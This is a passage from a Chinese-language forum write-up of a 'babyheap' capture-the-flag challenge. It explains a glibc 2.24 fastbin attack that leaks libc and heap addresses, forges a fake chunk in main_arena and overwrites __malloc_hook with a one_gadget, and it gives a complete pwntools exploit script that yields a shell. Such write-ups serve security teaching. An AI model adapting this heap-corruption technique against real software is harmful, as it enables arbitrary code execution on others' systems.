
图片.png (127.37 KB, 下载次数: 0)  
[附件](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjY0Mjc4NXwwYzYyNTFmNXwxNzkzNTczMTIzfDE2ODA4NnwxODMzNDE0&nothumb=yes)  
7  
2023-9-13 20:02 上传

我们再次申请一块`0x48`大小的空间将把`chunk2`申请出来，此时`list[2]`和`list[4]`指向同一地址。依次释放`list[1]`和`list[2]`我们，此时`chunk2`的`fd`指针将会指向`chunk1`的`prev_size`，此时`list[4]`依然有读写权限，可以用来泄露`chunk1`的地址。但我们要想修改`malloc_hook`的值，现在`list[1]`和`list[2]`都是空的，`list[4]`指向`chunk2`，我们可以通过`list[4]`修改`chunk2_fd`，制造`fake_chunk`迁移到`main_arena`上面，覆盖掉`top_chunk`的指针，改到`__malloc_hook`上面。但`0x56`开头的堆地址才能绕过`libc_calloc()`的断言。

### getshell

```python
def get_shell():
    one_gadget = libc_base + 0x3f50a
    malloc_hook = libc_base + libc.symbols['__malloc_hook']
    main_arena = libc_base + libc.symbols['main_arena']

    alloc(0x58)  # 1 chunk4
    delete(1)
    update(4, 0x8, p64(main_arena + 0x25))
    alloc(0x48)  # 1 chunk2
    alloc(0x48)  # 2 fake_chunk
    debug()  # d1
    update(2, 0x23 + 0x8, b'b' * 0x23 + p64(malloc_hook - 0x10))
    debug()  # d2
    alloc(0x48)  # 5
    update(5, 0x8, p64(one_gadget))
    debug()  # d3
    p.recvuntil(b'Command: ')
    p.sendline(b'1')
    p.recvuntil(b'Size: ')
    p.sendline(b'20')
```

![图片.png](https://attach.52pojie.cn/forum/202309/13/210347hwseqztnsp8gzgip.png)

图片.png (102.56 KB, 下载次数: 0)  
[附件](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjY0Mjc5MHxjODkxYjZkOHwxNzkzNTczMTIzfDE2ODA4NnwxODMzNDE0&nothumb=yes)  
8  
2023-9-13 21:03 上传

我们申请并释放一个`0x60`大小的`chunk`，用于改变`main_arena`的结构，将`0x56`填写进`main_arena`，然后通过截断，将`0x56`截取出来，作为`fake_chunk_size`，绕过 fast bin 检查。

![图片.png](https://attach.52pojie.cn/forum/202309/13/210656gx8f0q3w8s8ts34s.png)

图片.png (110.48 KB, 下载次数: 1)  
[附件](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjY0Mjc5MnwwZGZjZmU0MHwxNzkzNTczMTIzfDE2ODA4NnwxODMzNDE0&nothumb=yes)  
9  
2023-9-13 21:06 上传

此时我们将其覆盖，我们把`main_arena`保存的`top_chunk`指针修改为`__mallloc_hook`上方`0x10`(`prev_size | size`)。

![图片.png](https://attach.52pojie.cn/forum/202309/13/211430skk7otsvoof57ro7.png)

图片.png (29.08 KB, 下载次数: 1)  
[附件](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjY0Mjc5NXxhYjIxOTMxY3wxNzkzNTczMTIzfDE2ODA4NnwxODMzNDE0&nothumb=yes)  
10  
2023-9-13 21:14 上传

我们再次申请将会把`__malloc_hook`申请出来，并且`__malloc_hook`是`fd`，将其改为`one_gadget`，然后随意申请一个堆块即可`get_shell`。

![图片.png](https://attach.52pojie.cn/forum/202309/13/211616ys7e65ai36l7ib3z.png)

图片.png (108.13 KB, 下载次数: 0)  
[附件](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjY0Mjc5Nnw4OGQ3OWVmMnwxNzkzNTczMTIzfDE2ODA4NnwxODMzNDE0&nothumb=yes)  
11  
2023-9-13 21:16 上传

### 完整exp

```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']


def connect():
    global elf, libc, p
    elf = ELF('./babyheap')
    libc = ELF('./libc-2.24.so')
    p = process('./babyheap')


is_debug = True


def debug(gdbscript=""):
    if is_debug:
        gdb.attach(p, gdbscript=gdbscript)
        pause()
    else:
        pass


def alloc(size):
    p.recvuntil(b'Command: ')
    p.sendline(b'1')
    p.recvuntil(b'Size: ')
    p.sendline(str(size).encode())
    p.recvuntil(b'Allocated\n')


def update(idx, size, content):
    p.recvuntil(b'Command: ')
    p.sendline(b'2')
    p.recvuntil(b'Index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'Size: ')
    p.sendline(str(size).encode())
    p.recvuntil(b'Content: ')
    p.sendline(content)
    p.recvuntil(b'Updated\n')


def delete(idx):
    p.recvuntil(b'Command: ')
    p.sendline(b'3')
    p.recvuntil(b'Index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'Deleted\n')


def view(idx):
    p.recvuntil(b'Command: ')
    p.sendline(b'4')
    p.recvuntil(b'Index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b']: ')


def leak():
    global libc_base, heap_addr, need
    alloc(0x48)  # 0 chunk0
    alloc(0x48)  # 1 chunk1
    alloc(0x48)  # 2 chunk2
    alloc(0x48)  # 3 chunk3
    update(0, 0x49, b'a' * 0x48 + p64(0xa1))
    delete(1)
    alloc(0x48)  # 1 chunk1
    view(2)
    libc_base = u64(p.recv(6).ljust(0x8, b'\x00')) - 0x398b58
    log.success("libc_base : 0x%x" % libc_base)
    alloc(0x48)  # 4 2 chunk2
    delete(1)
    delete(2)
    view(4)
    heap_addr = u64(p.recv(8)) - 0x50
    log.success("heap_addr : 0x%x" % heap_addr)
    need = hex(heap_addr)[:4]
    if need == '0x55':
        log.info("Not match")
        p.close()
    elif need == '0x56':
        need = False;
    else:
        log.info("Error size")


def get_shell():
    one_gadget = libc_base + 0x3f50a
    malloc_hook = libc_base + libc.symbols['__malloc_hook']
    main_arena = libc_base + libc.symbols['main_arena']

    alloc(0x58)  # 1 chunk4
    delete(1)
    update(4, 0x8, p64(main_arena + 0x25))
    alloc(0x48)  # 1 chunk2
    alloc(0x48)  # 2 fake_chunk
    update(2, 0x23 + 0x8, b'b' * 0x23 + p64(malloc_hook - 0x10))
    alloc(0x48)  # 5
    update(5, 0x8, p64(one_gadget))
    p.recvuntil(b'Command: ')
    p.sendline(b'1')
    p.recvuntil(b'Size: ')
    p.sendline(b'20')


def pwn():
    connect()
    leak()
    while need:
        connect()
        leak()
    get_shell()
    p.interactive()


if __name__ == '__main__':
    pwn()
```
